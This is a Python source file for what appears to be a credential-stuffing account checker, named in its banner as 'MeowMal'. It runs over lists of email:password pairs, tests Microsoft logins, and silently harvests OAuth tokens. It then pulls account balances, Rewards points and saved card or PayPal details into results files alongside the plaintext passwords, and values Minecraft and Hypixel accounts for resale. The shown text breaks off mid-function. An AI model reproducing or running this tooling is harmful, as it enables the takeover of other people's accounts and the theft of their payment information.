import concurrent.futures
import configparser
import json
import imaplib
import ssl
import os
import shutil
import random
import re
import socket
import string
import sys
import threading
import time
import traceback
import uuid
import warnings
from datetime import datetime, timezone
import urllib.parse
from urllib.parse import urlparse, parse_qs
import readchar
import requests
import socks
import urllib3
from colorama import Fore, Style, init as colorama_init
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

colorama_init(autoreset=False, strip=False)
file_lock = threading.Lock()
proxy_lock = threading.Lock()


_write_buffer = {}  
_write_buffer_lock = threading.Lock()
_write_seen = {}  
_WRITE_FLUSH_THRESHOLD = 1

def _flush_write_buffer(path=None):

    with _write_buffer_lock:
        paths_to_flush = [path] if path else list(_write_buffer.keys())
    for p in paths_to_flush:
        with _write_buffer_lock:
            entries = _write_buffer.pop(p, [])
        if not entries:
            continue
        try:
            dir_path = os.path.dirname(p)
            if dir_path:
                os.makedirs(dir_path, exist_ok=True)
            with open(p, 'a', encoding='utf-8') as f:
                f.write(''.join(entries))
                f.flush()
        except Exception:
            pass

def _flush_all_buffers_periodic():

    while True:
        time.sleep(2)
        try:
            _flush_write_buffer()
        except Exception:
            pass

threading.Thread(target=_flush_all_buffers_periodic, daemon=True).start()

def write_dedupe(fname, filename, content):
    path = f'results/{fname}/{filename}'
    content_key = content.strip()
    with _write_buffer_lock:
        if path not in _write_seen:
            _write_seen[path] = set()

            try:
                if os.path.exists(path):
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            _write_seen[path].add(line.strip())
            except Exception:
                pass
        if content_key in _write_seen[path]:
            return
        _write_seen[path].add(content_key)
        if path not in _write_buffer:
            _write_buffer[path] = []
        _write_buffer[path].append(content)
        should_flush = len(_write_buffer[path]) >= _WRITE_FLUSH_THRESHOLD
    if should_flush:
        _flush_write_buffer(path)

def safe_write_file(filepath, content, mode='a'):

    dir_path = os.path.dirname(filepath)
    if dir_path:
        try:
            os.makedirs(dir_path, exist_ok=True)
        except Exception:
            pass
    with open(filepath, mode, encoding='utf-8') as f:
        f.write(content)

def get_optimized_timeout(config=None):
    timeout_val = int(config.get('timeout', 15)) if config else 15
    if config and config.get('optimize_network', True):
        return (max(5, timeout_val // 2), timeout_val)
    else:
        return timeout_val
if sys.platform == 'win32':
    try:
        os.system('chcp 65001 >nul 2>&1')
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
        else:
            import io
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)
            sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace', line_buffering=True)
    except Exception:
        pass
class SimpleUtils:
    _title_cache = ''
    @staticmethod
    def set_title(title):
        if title == SimpleUtils._title_cache:
            return
        SimpleUtils._title_cache = title
        if sys.platform == 'win32':
            try:
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            except Exception:
                pass
        else:
            try:
                sys.stdout.write(f'\x1b]0;{title}\x07')
                sys.stdout.flush()
            except Exception:
                pass
utils = SimpleUtils()
_FORMAT_THRESHOLDS = [(1000000000.0, 'B', 2), (1000000.0, 'M', 2), (1000.0, 'K', 1)]
def format_number(num):
    if not isinstance(num, (int, float)):
        try:
            num = float(num)
        except (ValueError, TypeError):
            return '0'
    num = float(num)
    if num < 0:
        return '0'
    for threshold, suffix, precision in _FORMAT_THRESHOLDS:
        if num >= threshold:
            return f'{num / threshold:.{precision}f}{suffix}'
    return str(int(num))
_DECORATIVE_SYMBOLS_RE = re.compile('[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+')
def clean_name(name):
    if not name:
        return ''
    return _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
def fetch_meowapi_stats(username, uuid=None):
    global config
    def format_coins(num):
        if not isinstance(num, (int, float)):
            return '0'
        num = float(num)
        abs_num = abs(num)
        if abs_num >= 1000000000000000.0:
            return f'{num / 1000000000000000.0:.1f}Q'
        if abs_num >= 1000000000000.0:
            return f'{num / 1000000000000.0:.1f}T'
        if abs_num >= 1000000000.0:
            return f'{num / 1000000000.0:.1f}B'
        if abs_num >= 1000000.0:
            return f'{num / 1000000.0:.1f}M'
        if abs_num >= 1000.0:
            return f'{num / 1000.0:.0f}K'
        return str(int(num))
    def get_skill_average(member):
        skills = member.get('skills', {})
        total_level = 0
        skill_count = 0
        skill_names = ['alchemy', 'carpentry', 'combat', 'enchanting', 'farming', 'fishing', 'foraging', 'mining', 'taming']
        for name in skill_names:
            skill_data = skills.get(name)
            if skill_data and 'levelWithProgress' in skill_data:
                total_level += skill_data['levelWithProgress']
                skill_count += 1
        return total_level / skill_count if skill_count > 0 else 0
    def clean_name_js(name):
        if not name:
            return ''
        cleaned = _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
        cleaned = re.sub('apis', '', cleaned, flags=re.IGNORECASE).strip()
        return cleaned
    try:
        timeout_val = int(config.get('timeout', 10))
        player_url = f'https://api.soopy.dev/player/{username}'
        p_data = None
        s_data = None
        if uuid:
            clean_uuid = uuid.replace('-', '')
            skyblock_url = f'https://soopy.dev/api/v2/player_skyblock/{clean_uuid}?networth=true'
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                f1 = executor.submit(requests.get, player_url, timeout=timeout_val)
                f2 = executor.submit(requests.get, skyblock_url, timeout=timeout_val)
                try:
                    resp1 = f1.result()
                    if resp1.status_code == 200:
                        p_data = resp1.json()
                except:
                    pass
                try:
                    resp2 = f2.result()
                    if resp2.status_code == 200:
                        s_data = resp2.json()
                except:
                    pass
        else:
            p = requests.get(player_url, timeout=timeout_val).json()
            if p.get('success') and 'data' in p:
                p_data = p
                fetched_uuid = p['data'].get('uuid', '').replace('-', '')
                if fetched_uuid:
                    skyblock_url = f'https://soopy.dev/api/v2/player_skyblock/{fetched_uuid}?networth=true'
                    s = requests.get(skyblock_url, timeout=timeout_val).json()
                    s_data = s
        if not p_data or not p_data.get('success') or 'data' not in p_data:
            return None
        data = p_data['data']
        final_uuid = uuid.replace('-', '') if uuid else data.get('uuid', '').replace('-', '')
        ach = data.get('achievements', {})
        skywars_stars = ach.get('skywars_you_re_a_star', 0)
        arcade_coins = ach.get('arcade_arcade_banker', 0)
        bedwars_stars = ach.get('bedwars_level', 0)
        uhc_bounty = ach.get('uhc_bounty', 0)
        pit_gold = ach.get('pit_gold', 0)
        s = s_data if s_data else {}
        best_member = None
        max_score = -1
        profiles_data = s.get('data', {}).get('profiles', {})
        for profile_id, profile in profiles_data.items():
            members = profile.get('members', {})
            member = members.get(uuid)
            if member:
                nw_detailed = member.get('nwDetailed', {})
                networth = nw_detailed.get('networth', 0) if nw_detailed else 0
                skill_avg = get_skill_average(member)
                sb_lvl = member.get('skyblock_level', 0)
                score = networth / 1000000 * 100 + skill_avg * 100 + sb_lvl * 10
                if score > max_score:
                    max_score = score
                    best_member = member
        coins = kills = fairy = networth = sb_lvl = 0
        avg_skill_level = 0.0
        item_list_str = ''
        if best_member:
            coins = best_member.get('coin_purse', 0)
            kills = best_member.get('kills', {}).get('total', 0)
            fairy = best_member.get('fairy_souls_collected', 0)
            sb_lvl = best_member.get('skyblock_level', 0)
            nw_detailed = best_member.get('nwDetailed', {})
            networth = nw_detailed.get('networth', 0) if nw_detailed else 0
            types = nw_detailed.get('types', {}) if nw_detailed else {}
            if networth == 0 and coins > 0:
                networth = coins
            avg_skill_level = get_skill_average(best_member)
            def collect_items(category_data):
                items_list = []
                if category_data and category_data.get('items'):
                    for i in category_data['items']:
                        clean = clean_name_js(i.get('name'))
                        if clean:
                            items_list.append(clean)
                return items_list
            all_valid_items = []
            for cat in ['armor', 'equipment', 'wardrobe', 'weapons', 'inventory']:
                all_valid_items.extend(collect_items(types.get(cat)))
            MAX_SHOWN_ITEMS = 5
            if len(all_valid_items) > MAX_SHOWN_ITEMS:
                shown_items = ', '.join(all_valid_items[:MAX_SHOWN_ITEMS])
                remaining = len(all_valid_items) - MAX_SHOWN_ITEMS
                item_list_str = f'{shown_items}, +{remaining} more'
            else:
                item_list_str = ', '.join(all_valid_items)
        parts = []
        if networth > 0:
            parts.append(f'NW: {format_coins(networth)}')
        if coins > 0:
            parts.append(f'Purse: {format_coins(coins)}')
        if avg_skill_level > 0:
            parts.append(f'Avg_Skill: {avg_skill_level:.2f}')
        if skywars_stars > 0:
            parts.append(f'SW: {skywars_stars}')
        if bedwars_stars > 0:
            parts.append(f'BW: {bedwars_stars}')
        if pit_gold > 0:
            parts.append(f'Pit_Gold: {format_coins(pit_gold)}')
        if uhc_bounty > 0:
            parts.append(f'UHC_Bounty: {format_coins(uhc_bounty)}')
        if sb_lvl > 0:
            parts.append(f'Sb_Lvl: {sb_lvl}')
        if arcade_coins > 0:
            parts.append(f'Arcade_Coins: {format_coins(arcade_coins)}')
        if kills > 0:
            parts.append(f'Sb_Kills: {kills}')
        if fairy > 0:
            parts.append(f'Sb_Fairy_Souls: {fairy}')
        if item_list_str:
            parts.append(f'Sb_Valuable_Items: {item_list_str}')
        return ' '.join(parts) if parts else None
    except Exception:
        return None
def validate_hex_color(color_str):
    if not color_str:
        return None
    color_str = str(color_str).strip()
    if color_str.startswith('#'):
        hex_part = color_str[1:]
        if len(hex_part) == 6 and all((c in '0123456789ABCDEFabcdef' for c in hex_part)):
            try:
                return int(hex_part, 16)
            except ValueError:
                return None
    else:
        try:
            decimal_val = int(color_str)
            if 0 <= decimal_val <= 16777215:
                return decimal_val
        except ValueError:
            pass
        if len(color_str) == 6 and all((c in '0123456789ABCDEFabcdef' for c in color_str)):
            try:
                return int(color_str, 16)
            except ValueError:
                pass
    return None

UI_ENABLED = True
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.networking.packets.clientbound import play as clientbound_play, login as clientbound_login
    from minecraft.networking.packets.serverbound.play import ChatPacket
    from minecraft.exceptions import LoginDisconnect, YggdrasilError
    import minecraft.authentication
    minecraft.authentication.HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Connection': 'close'
    }
    MINECRAFT_AVAILABLE = True
    import threading
    import sys as _sys
    _original_excepthook = threading.excepthook if hasattr(threading, 'excepthook') else None
    def _silent_excepthook(args):
        if args.exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            return
        if 'minecraft.networking' in str(args.exc_traceback) or 'minecraft.exceptions' in str(args.exc_traceback):
            return
        if _original_excepthook:
            _original_excepthook(args)
    if hasattr(threading, 'excepthook'):
        threading.excepthook = _silent_excepthook
    _original_sys_excepthook = _sys.excepthook
    def _silent_sys_excepthook(exc_type, exc_value, exc_traceback):
        if exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            if exc_traceback and ('minecraft' in str(exc_traceback.tb_frame) or 'minecraft' in str(exc_value)):
                return
        _original_sys_excepthook(exc_type, exc_value, exc_traceback)
    _sys.excepthook = _silent_sys_excepthook
except ImportError:
    MINECRAFT_AVAILABLE = False
    print(f'{Fore.YELLOW}Warning: pyCraft not available. Hypixel ban checking disabled.{Fore.RESET}')
ANSI_ESCAPE = re.compile('\\x1B(?:[@-Z\\\\-_]|\\[[0-?]*[ -/]*[@-~])')
HYPIXEL_NAME = re.compile(r'(?<=content="Plancke" /><meta property="og:locale" content="en_US" /><meta property="og:description" content=").+?(?=")', re.S)
HYPIXEL_TITLE = re.compile(r'<title>(.+?)\s*\|\s*Plancke</title>', re.IGNORECASE)
HYPIXEL_LEVEL = re.compile(r'(?<=Level:</b> ).+?(?=<br/><b>)')
FIRST_LOGIN = re.compile(r'(?<=<b>First login: </b>).+?(?=<br/><b>)')
LAST_LOGIN = re.compile(r'(?<=<b>Last login: </b>).+?(?=<br/>)')
BW_STARS = re.compile(r'(?<=<li><b>Level:</b> ).+?(?=</li>)')
SB_NETWORTH = re.compile(r'(?<= Networth: ).+?(?=\\n)')
autopay_count = 0

class UIManager:
    def __init__(self):
        self.width = 120
        self.height = 30
        self.logs = []
        self.max_logs = 100
        self.log_initialized = False
        self.cui_initialized = False
        self.cui_grid_lines = 0
        self.log_area_limit = 300
        self.log_area_count = 0
        self._cached_stats = {}
        self._cached_colors = None
        self._cached_ascii_logo = None
        self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'autopay': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0, 'banned': 0, 'unbanned': 0}
        self.start_time = None
        self._lock = threading.Lock()
    def reset_log_area(self):
        self.log_start_line = max(15, self.height - 10)
        print(f'\x1b[{self.log_start_line};0H', end='')
        self.clear_from_cursor()
        self.log_area_count = 0
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    def move_cursor_home(self):
        print('\x1b[H', end='')
    def clear_from_cursor(self):
        print('\x1b[J', end='')
    def _strip_ansi(self, text):
        return ANSI_ESCAPE.sub('', text)
    def show_ui_screen(self):
        if not getattr(self, 'log_initialized', False):
            self.clear_screen()
            _title = Fore.CYAN
            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.3 | Dev: MeowMal Dev's \n"
            print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
            print('')
            print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
            self.log_initialized = True
        return
    def screen_ui_log(self):
        return self.show_ui_screen()
    def show_error_screen(self, error_msg):
        self.log_error(error_msg)

    def show_finished_screen(self, results_folder):
        self.clear_screen()
        elapsed = self._get_elapsed_time()
        banned_count = 0
        unbanned_count = 0
        try:
            banned_path = os.path.join(results_folder, 'Banned.txt')
            if os.path.exists(banned_path):
                with open(banned_path, 'r', encoding='utf-8', errors='ignore') as bf:
                    banned_count = sum((1 for _ in bf if _.strip()))
        except Exception:
            banned_count = 0
        try:
            unbanned_path = os.path.join(results_folder, 'Unbanned.txt')
            if os.path.exists(unbanned_path):
                with open(unbanned_path, 'r', encoding='utf-8', errors='ignore') as uf:
                    unbanned_count = sum((1 for _ in uf if _.strip()))
        except Exception:
            unbanned_count = 0
        print(f"\n{Fore.CYAN}{'═' * 83}")
        print(f'{Fore.GREEN} ✓ CHECKING COMPLETED! {Fore.RESET}')
        print(f"{Fore.CYAN}{'═' * 83}{Fore.RESET}\n")
        print(f'{Fore.WHITE}Time: {Fore.CYAN}{elapsed}{Fore.RESET}')
        print(f"{Fore.WHITE}Valid Mail: {Fore.GREEN}{self.stats.get('valid_mail', 0)}{Fore.RESET}")
        print(f"{Fore.WHITE}Bad: {Fore.RED}{self.stats.get('bad', 0)}{Fore.RESET}")
        print(f"{Fore.WHITE}2FA: {Fore.YELLOW}{self.stats.get('twofa', 0)}{Fore.RESET}")
        print(f"{Fore.WHITE}Minecraft Hits: {Fore.GREEN}{self.stats.get('hits', 0)}{Fore.RESET}")
        print(f"{Fore.WHITE}DonutSMP AutoPay: {Fore.LIGHTCYAN_EX}{self.stats.get('autopay', 0)}{Fore.RESET}")
        print(f"{Fore.WHITE}Unbanned: {Fore.GREEN}{unbanned_count}{Fore.RESET}")
        print(f'{Fore.WHITE}Banned: {Fore.RED}{banned_count}{Fore.RESET}')
        print(f"{Fore.WHITE}XGP: {Fore.LIGHTBLUE_EX}{self.stats.get('xgp', 0)}{Fore.RESET}")
        print(f"{Fore.WHITE}XGPU: {Fore.LIGHTCYAN_EX}{self.stats.get('xgpu', 0)}{Fore.RESET}")
        print(f"{Fore.WHITE}SFA: {Fore.YELLOW}{self.stats.get('sfa', 0)}{Fore.RESET}\n")
    def add_log(self, message, level='INFO'):
        with self._lock:

            if level not in ('HIT', 'BAD', '2FA', 'VALID_MAIL', 'AUTOPAY'):
                if not (level == 'SUCCESS' and 'Valid Mail' in message):
                    return
            if level == 'HIT':
                log_entry = message
            elif level == 'BAD':
                log_entry = f'{Fore.RED}[BAD]{Style.RESET_ALL} {message}' if not message.startswith('\x1b') else message
            elif level == '2FA':
                log_entry = f'{Fore.MAGENTA}[2FA]{Style.RESET_ALL} {message}' if not message.startswith('\x1b') else message
            elif level in ('VALID_MAIL', 'SUCCESS'):
                log_entry = f'{Fore.GREEN}[VALID MAIL]{Style.RESET_ALL} {message}' if not message.startswith('[VALID MAIL]') and not message.startswith('\x1b') else message
            elif level == 'AUTOPAY':
                log_entry = f'{Fore.CYAN}[DONUT SMP AUTOPAY]{Style.RESET_ALL} {message}'
            else:
                log_entry = message
            self.logs.append(log_entry)
            if len(self.logs) > self.max_logs:
                self.logs = self.logs[-self.max_logs:]
            try:
                print(log_entry, flush=True)
            except Exception:
                pass
    def log_hit_formatted(self, capture_obj, extra_stats=None, precomputed_line=None):
        try:
            elapsed_str = self._get_elapsed_time()
            time_part = f'[{elapsed_str}]'
            if capture_obj.banned and capture_obj.banned != 'False' and not str(capture_obj.banned).startswith('[Unchecked]') and not str(capture_obj.banned).startswith('[Error]'):
                status_part = '[Banned]'
                color = Fore.RED
            elif capture_obj.banned == 'False' or str(capture_obj.banned).startswith('[Error]') or str(capture_obj.banned).startswith('[Unchecked]'):
                status_part = '[Unbanned]'
                color = Fore.GREEN
            else:
                status_part = '[Unbanned]'
                color = Fore.GREEN
            
            if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
                color = Fore.CYAN
            tags_part = ''
            if capture_obj.type:
                type_upper = str(capture_obj.type).upper()
                if 'GAME PASS' in type_upper or 'XGP' in type_upper:
                    if 'ULTIMATE' in type_upper or 'XGPU' in type_upper:
                        tags_part += '[XGPU]'
                    else:
                        tags_part += '[XGP]'
                if 'MINECRAFT' in type_upper or 'MC' in type_upper:
                    tags_part += '[MC]'
            if not tags_part:
                tags_part = '[MC]'  
            if capture_obj.capes and capture_obj.capes != '':
                tags_part += f'[{capture_obj.capes}]'
            if capture_obj.cape and capture_obj.cape == 'Yes':
                tags_part += '[Optifine]'
            pwd = capture_obj.password
            if len(pwd) > 4:
                masked_pwd = pwd[:2] + '*' * (len(pwd) - 4) + pwd[-2:]
            else:
                masked_pwd = '*' * len(pwd)
            if capture_obj.hypixl and capture_obj.hypixl != 'N/A':
                user_display = capture_obj.hypixl
            elif capture_obj.name and capture_obj.name != 'N/A':
                user_display = capture_obj.name
            else:
                user_display = 'nonameset'
            account_part = f'{capture_obj.email}:{masked_pwd}:{user_display}'
            stats_parts = []
            if hasattr(capture_obj, 'bwstars') and capture_obj.bwstars:
                try:
                     val = int(str(capture_obj.bwstars).replace(',', '').strip())
                     if val > 0:
                         stats_parts.append(f'BW: {capture_obj.bwstars}')
                except:
                     if str(capture_obj.bwstars) != '0':
                         stats_parts.append(f'BW: {capture_obj.bwstars}')

            if hasattr(capture_obj, 'swstars') and capture_obj.swstars and (str(capture_obj.swstars) not in ('N/A', '', '0')):
                try:
                     val = int(str(capture_obj.swstars).replace(',', '').strip())
                     if val > 0:
                         stats_parts.append(f'SW: {capture_obj.swstars}')
                except:
                     stats_parts.append(f'SW: {capture_obj.swstars}')
            if hasattr(capture_obj, 'sbcoins') and capture_obj.sbcoins and (str(capture_obj.sbcoins) not in ('N/A', '', 'None')):
                stats_parts.append(f'Sb_Coins: {capture_obj.sbcoins}')
            if hasattr(capture_obj, 'sbnetworth') and capture_obj.sbnetworth and (str(capture_obj.sbnetworth) not in ('N/A', '', 'None')):
                stats_parts.append(f'Sb_Networth: {capture_obj.sbnetworth}')
            if hasattr(capture_obj, 'pitcoins') and capture_obj.pitcoins and (str(capture_obj.pitcoins) not in ('N/A', '', 'None')):
                stats_parts.append(f'Pit_Coins: {capture_obj.pitcoins}')
            
            stats_part = ''
            if stats_parts:
                stats_part = ' [Hypixel: ' + ', '.join(stats_parts) + ']'
            elif extra_stats:
                clean_stats = extra_stats.strip(' |')
                stats_part = f' [Hypixel: {clean_stats}]'
            final_content = f'{time_part} {status_part}{tags_part} {account_part}{stats_part}'
            colored_line = f'{color}{final_content}{Style.RESET_ALL}'
            self.add_log(colored_line, 'HIT')
        except Exception:
            self.log_hit(getattr(capture_obj, 'email', ''), getattr(capture_obj, 'type', ''))
    def update_stats(self, **kwargs):
        for key, value in kwargs.items():
            if key in self.stats:
                self.stats[key] = value
    def increment_stat(self, stat_name, amount=1):
        if stat_name in self.stats:
            self.stats[stat_name] += amount
    def start_checking(self, total):
        self.start_time = time.time()
        self.stats['total'] = total
        self.add_log(f'Starting check on {total} accounts...', 'INFO')
    def log_hit(self, email, account_type):
        self.add_log(f'HIT: {email} | Type: {account_type}', 'HIT')
    def log_bad(self, email):
        self.add_log(f'{Fore.RED}[BAD]{Style.RESET_ALL} {email}', 'BAD')
    def log_2fa(self, email):
        self.add_log(f'{Fore.MAGENTA}[2FA]{Style.RESET_ALL} {email}', '2FA')
    def log_valid_mail(self, email):
        self.add_log(f'{Fore.GREEN}[VALID MAIL]{Style.RESET_ALL} {email}', 'VALID_MAIL')
    def log_payment(self, email, details):
        pass
    def log_error(self, message):
        self.add_log(message, 'ERROR')
        self.increment_stat('errors')
    def log_info(self, message):
        self.add_log(message, 'INFO')
    def calculate_cpm(self):
        if self.start_time and self.stats['checked'] > 0:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                self.stats['cpm'] = int(self.stats['checked'] / elapsed * 60)
    def _get_elapsed_time(self):
        if not self.start_time:
            return '00:00:00'
        elapsed = int(time.time() - self.start_time)
        hours = elapsed // 3600
        minutes = elapsed % 3600 // 60
        seconds = elapsed % 60
        return f'{hours:02d}:{minutes:02d}:{seconds:02d}'
    def _get_percentage(self, value, total):
        if total == 0:
            return '0.0%'
        return f'{value / total * 100:.1f}%'
ui = UIManager()
class MicrosoftChecker:
    def __init__(self, session, email, password, config, fname):
        self.session = session
        self.email = email
        self.password = password
        self.config = config
        self.fname = fname
        self._token_cache = {}
        self._token_cache_timeout = 300
    def get_auth_token(self, client_id, scope, redirect_uri):
        cache_key = f'{client_id}:{scope}:{redirect_uri}'
        if cache_key in self._token_cache:
            token_data = self._token_cache[cache_key]
            if time.time() - token_data['timestamp'] < self._token_cache_timeout:
                return token_data['token']
        try:
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri={redirect_uri}&prompt=none'
            timeout_sec = int(self.config.get('timeout', 10))
            token = None
            try:
                r = self.session.get(auth_url, timeout=timeout_sec, allow_redirects=False)
                loc = r.headers.get('Location', '')
                if 'access_token=' in loc:
                    token = urllib.parse.unquote(loc.split('access_token=')[1].split('&')[0])
                elif r.status_code == 200 and 'access_token=' in r.text:
                    token = urllib.parse.unquote(r.text.split('access_token=')[1].split('&')[0].split('"')[0].split("'")[0])
            except Exception:
                pass
            if not token:
                try:
                    r2 = self.session.get(auth_url, timeout=timeout_sec, allow_redirects=True)
                    for resp in getattr(r2, 'history', []):
                        hloc = resp.headers.get('Location', '')
                        if 'access_token=' in hloc:
                            token = urllib.parse.unquote(hloc.split('access_token=')[1].split('&')[0])
                            break
                    if not token and 'access_token=' in getattr(r2, 'url', ''):
                        token = parse_qs(urlparse(r2.url).fragment).get('access_token', [None])[0]
                    if not token and 'access_token=' in getattr(r2, 'text', ''):
                        token = urllib.parse.unquote(r2.text.split('access_token=')[1].split('&')[0].split('"')[0].split("'")[0])
                except Exception:
                    pass
            if token and len(token) > 10 and token.lower() != 'none':
                self._token_cache[cache_key] = {'token': token, 'timestamp': time.time()}
                return token
            return None
        except Exception:
            return None
    def check_balance(self):
        try:
            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
            if not token:
                return None
            headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
            r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=15)
            if r.status_code == 200:
                balance_match = re.search('"balance":(\\d+\\.?\\d*)', r.text)
                if balance_match:
                    balance = balance_match.group(1)
                    currency_match = re.search('"currency":"([A-Z]{3})"', r.text)
                    currency = currency_match.group(1) if currency_match else 'USD'
                    return f'{balance} {currency}'
            return '0.00 USD'
        except (requests.RequestException, TimeoutError, ConnectionError, json.JSONDecodeError):
            return None
    def check_rewards_points(self):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Pragma': 'no-cache', 'Accept': '*/*'}
            r = self.session.get('https://rewards.bing.com/', headers=headers, timeout=int(self.config.get('timeout', 10)))
            if 'action="https://rewards.bing.com/signin-oidc"' in r.text or 'id="fmHF"' in r.text:
                action_match = re.search('action="([^"]+)"', r.text)
                if action_match:
                    action_url = action_match.group(1)
                    data = {}
                    for input_match in re.finditer('<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">', r.text):
                        data[input_match.group(1)] = input_match.group(2)
                    r = self.session.post(action_url, data=data, headers=headers, timeout=int(self.config.get('timeout', 10)))
            all_matches = re.findall(',"availablePoints":(\\d+)', r.text)
            if all_matches:
                points = max(all_matches, key=int)
                if points != '0':
                    return points
            headers_home = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Referer': 'https://www.bing.com/', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'}
            self.session.get('https://www.bing.com/', headers=headers_home, timeout=15)
            ts = int(time.time() * 1000)
            flyout_url = f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}'
            headers_flyout = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Accept-Encoding': 'identity', 'Referer': 'https://www.bing.com/', 'X-Requested-With': 'XMLHttpRequest'}
            r_flyout = self.session.get(flyout_url, headers=headers_flyout, timeout=15)
            if r_flyout.status_code == 200:
                try:
                    data = r_flyout.json()
                    if data.get('userInfo', {}).get('isRewardsUser'):
                        balance = data.get('userInfo', {}).get('balance')
                        return str(balance)
                except ValueError:
                    pass
            return None
        except Exception:
            return None
    def check_payment_instruments(self):
        try:
            instruments = []
            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
            if token:
                headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
                r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=15)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        for item in data:
                            if 'paymentMethod' in item:
                                pm = item['paymentMethod']
                                family = pm.get('paymentMethodFamily')
                                type_ = pm.get('paymentMethodType')
                                if family == 'credit_card':
                                    last4 = pm.get('lastFourDigits', 'N/A')
                                    expiry = f"{pm.get('expiryMonth', '')}/{pm.get('expiryYear', '')}"
                                    card_line = f'{self.email}:{self.password} | CC: {type_} *{last4} ({expiry})\n'
                                    write_dedupe(self.fname, 'payment.txt', card_line)
                                    instruments.append(f'CC: {type_} *{last4} ({expiry})')
                                elif family == 'paypal':
                                    email = pm.get('email', 'N/A')
                                    paypal_line = f'{self.email}:{self.password} | PayPal: {email}\n'
                                    write_dedupe(self.fname, 'payment.txt', paypal_line)
                                    instruments.append(f'PayPal: {email}')
                    except Exception:
                        pass
            if not instruments:
                try:
                    r2 = self.session.get('https://account.microsoft.com/billing/api/payment-methods', timeout=12)
                    if r2.status_code == 200 and ('credit_card' in r2.text.lower() or 'paypal' in r2.text.lower() or 'card' in r2.text.lower()):
                        card_line = f'{self.email}:{self.password} | Payment Method Found\n'
                        write_dedupe(self.fname, 'payment.txt', card_line)
                        instruments.append('Payment Method Found')
                except Exception:
                    pass
            return instruments
        except Exception:
            return []
    def get_graph_token(self):
        if hasattr(self, '_graph_token') and self._graph_token:
            return self._graph_token
        scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read'
        token = self.get_auth_token('0000000048170EF2', scope, 'https://login.live.com/oauth20_desktop.srf')
        if not token:
            token = self.get_auth_token('0000000048170EF2', 'https://graph.microsoft.com/Mail.Read', 'https://login.live.com/oauth20_desktop.srf')
        if not token:
            token = self.get_auth_token('0000000048170EF2', 'https://graph.microsoft.com/User.Read', 'https://login.live.com/oauth20_desktop.srf')
        if not token:
